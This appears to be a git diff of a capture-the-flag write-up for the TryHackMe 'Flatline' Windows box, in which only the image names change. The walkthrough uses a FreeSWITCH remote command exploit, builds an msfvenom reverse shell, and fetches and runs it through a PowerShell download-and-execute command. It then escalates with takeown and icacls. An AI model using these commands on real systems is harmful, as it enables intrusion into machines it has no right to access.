@@ -28,15 +28,15 @@ Since this is a windows box with host discovery disabled, we will do the followi
 ```bash
 nmap -sC -sV -vv -Pn $IP
 ```
-![[Pasted image 20220301114043.png]]
+![[Nmap scan.png]]
 There is only one port that we can research to find a vulnerability and that is port 8021:
-![[Pasted image 20220301114150.png]]
+![[Interesting service on port 8021.png]]
 Search either on Google or `searchsploit` for "freeswitch"
 ```bash
 searchsploit freeswitch
 ```
 This gives us two options, of which we will use the second one:
-![[Pasted image 20220301114503.png]]
+![[Searching for exploits of FreeSWITCH.png]]
 Now using `searchsploit` we can copy the `windows/remote/47799.txt` into our directory used to enumerate the box (for instance in `thm/flatline`.
 
 ```bash
@@ -51,13 +51,13 @@ To use the exploit, you'll need to provide it with the IP of the target and also
 python3 exploit.py $IP whoami
 ```
 Which will output:
-![[Pasted image 20220301115733.png]]
+![[Running the exploit to and getting code execution.png]]
 
 We will now create a reverse tcp shell to connect to the target. Run`ip a` and copy the `tun0` IP address (after `inet`) when connected to the TryHackMe VPN. Replace "ATTACK-IP" with what you copied.
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACK-IP> LPORT=4444 -f exe > shell.exe
 ```
-![[Pasted image 20220301121738.png]]
+![[Creating paylod for reverse shell.png]]
 
 We'll also need an `http` server running to upload our `.exe` file to the target so do this in a separate terminal tab:
 ```bash
@@ -73,13 +73,13 @@ Last but not least, run the exploit with the appropriate set up. Make sure to ch
 ```bash
 python3 exploit.py 10.10.42.179 "powershell.exe Invoke-WebRequest -Uri http://10.2.104.41:8000/shell.exe -OutFile ./shell.exe && .\shell.exe"
 ```
-![[Pasted image 20220301122611.png]]
+![[Running python exploit with Powershell.png]]
 Go back to the listener and you should see that you're connected to the target.
 
 #TODO
 
 Browse to `Nekrotic`'s Desktop and list out it's contents:
-![[Pasted image 20220301120339.png]]
+![[Printing out Desktop to find flags.png]]
 
 We see both flags but will need to escalate privileges to view the `root.txt` flag. 
 
@@ -92,13 +92,13 @@ and to get the root flag do:
 takeown /R /F *.*
 ```
 
-![[Pasted image 20220301120639.png]]
+![[Taking ownership of Desktop folder.png]]
 #TODO
 I'm not certain if we need to do this next step but it's worth a shot:
 ```bash
 icacls "root".txt /q /c /t /grant Users:F
 ```
-![[Pasted image 20220301120849.png]]
+![[Modifying permissions on root flag.png]]
 
 Now switch over to `powershell` so we can `cat` out our root flag.
 ```bash
@@ -106,6 +106,6 @@ powershell
 ```
 
 NOTE: both `cat` in `powershell` and `type` in `cmd` will output the root flag:
-![[Pasted image 20220301121141.png]]
+![[Printing out root flag.png]]
 
 Done. You have successfully completed this challenge.
